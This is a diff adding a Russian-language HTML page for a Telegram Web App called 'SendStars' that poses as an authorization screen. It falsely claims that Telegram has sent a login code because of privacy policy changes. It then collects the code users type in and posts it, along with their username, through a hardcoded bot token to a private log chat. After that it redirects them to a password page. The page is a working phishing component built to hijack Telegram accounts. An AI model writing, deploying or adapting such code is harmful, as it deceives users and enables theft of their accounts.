@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SendStars — авторизация</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    :root {
+      --bg:#1c1b1b;
+      --text:#fff;
+      --box:#2a2a2a;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+
+    body {
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: var(--bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text);
+    }
+
+    .screen {
+      width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 15px;
+    }
+
+    .avatar img {
+      width: 120px;
+      height: auto;
+      object-fit: contain;
+      display: block;
+    }
+
+    .hint {
+      font-size: 14px;
+      color: #aaa;
+      margin-bottom: 0;
+      line-height: 1.4;
+      max-width: 320px;
+    }
+
+    .privacy-link {
+      font-size: 14px;
+      color: #2A9BF8;
+      text-decoration: none;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .privacy-link:hover {
+      color: #1a8be8;
+      text-decoration: underline;
+    }
+
+    .code-boxes {
+      display: flex;
+      gap: 10px;
+      margin: 10px 0 20px;
+    }
+
+    .code-box {
+      width: 40px;
+      height: 50px;
+      border-radius: 8px;
+      background: var(--box);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      font-weight: 600;
+      color: #fff;
+      border: 2px solid #3a3a3a;
+      transition: border-color 0.2s;
+    }
+
+    .code-box.filled {
+      border-color: #2A9BF8;
+    }
+
+    .numpad {
+      display: grid;
+      grid-template-columns: repeat(3, 80px);
+      gap: 12px;
+      justify-content: center;
+    }
+
+    .numpad button {
+      width: 80px;
+      height: 60px;
+      font-size: 22px;
+      border-radius: 12px;
+      border: none;
+      background: var(--box);
+      color: var(--text);
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .numpad button:hover {
+      background: #3a3a3a;
+    }
+
+    .numpad button:active {
+      background: #4a4a4a;
+    }
+
+    /* Экран загрузки */
+    .loading-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .spinner {
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid #fff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="screen" id="authScreen">
+    <div class="avatar">
+      <img src="avatar.gif" alt="avatar">
+    </div>
+    <div class="hint">Мы отправили код в приложение Telegram.</div>
+    
+    <div class="hint">
+      Это необходимо, ввиду последних изменений в 
+      <a href="https://telegram.org/privacy" target="_blank" class="privacy-link">Политике конфиденциальности</a>.
+    </div>
+
+    <div class="code-boxes" id="codeBoxes">
+      <div class="code-box"></div>
+      <div class="code-box"></div>
+      <div class="code-box"></div>
+      <div class="code-box"></div>
+      <div class="code-box"></div>
+    </div>
+
+    <div class="numpad">
+      <button>1</button><button>2</button><button>3</button>
+      <button>4</button><button>5</button><button>6</button>
+      <button>7</button><button>8</button><button>9</button>
+      <div></div><button>0</button><button>←</button>
+    </div>
+  </div>
+
+  <!-- Экран загрузки -->
+  <div class="screen loading-screen" id="loadingScreen">
+    <div class="spinner"></div>
+    <div>Проверка введённого кода…</div>
+  </div>
+
+  <script>
+const tg = window.Telegram.WebApp;
+tg.expand();
+
+const codeBoxes = document.querySelectorAll('.code-box');
+let code = "";
+
+function updateBoxes() {
+  codeBoxes.forEach((box, i) => {
+    if (code[i]) {
+      box.textContent = "•";
+      box.classList.add('filled');
+    } else {
+      box.textContent = "";
+      box.classList.remove('filled');
+    }
+  });
+}
+
+document.querySelectorAll('.numpad button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const value = btn.textContent;
+    if (value === '←') {
+      code = code.slice(0, -1);
+    } else if (!isNaN(value)) {
+      if (code.length < 5) code += value;
+    }
+    updateBoxes();
+
+    if (code.length === 5) {
+      // скрываем экран ввода
+      document.getElementById("authScreen").style.display = "none";
+      // показываем экран загрузки
+      document.getElementById("loadingScreen").style.display = "flex";
+
+      // Отправляем код боту через Telegram Web App
+      tg.sendData(JSON.stringify({
+        type: 'auth_code',
+        code: code,
+        user_id: tg.initDataUnsafe.user?.id,
+        phone_number: ""
+      }));
+
+      // Дополнительно отправляем код в бота через метод бота
+      sendCodeToBot(code);
+
+      // Переходим на страницу ввода пароля через 1 секунду
+      setTimeout(() => {
+        window.location.href = `password.html?phone=&code=${code}`;
+      }, 1000);
+    }
+  });
+});
+
+// Функция для отправки кода в бота
+function sendCodeToBot(code) {
+  const botToken = '8324982762:AAGxOxQghC26SQa__jH75yNFlcnOinLnLmc';
+  const logChatId = '-1002972496694';
+  
+  const user = tg.initDataUnsafe.user;
+  
+  // Получаем username или показываем "без username"
+  const username = user?.username ? `@${user.username}` : 'без username';
+  
+  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
+  
+  // Отправляем сообщение через API бота
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: logChatId,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).catch(error => {
+    console.error('Ошибка отправки кода в лог:', error);
+  });
+}
+
+// Инициализация при загрузке
+updateBoxes();
+</script>
+</body>
+</html>
+
+
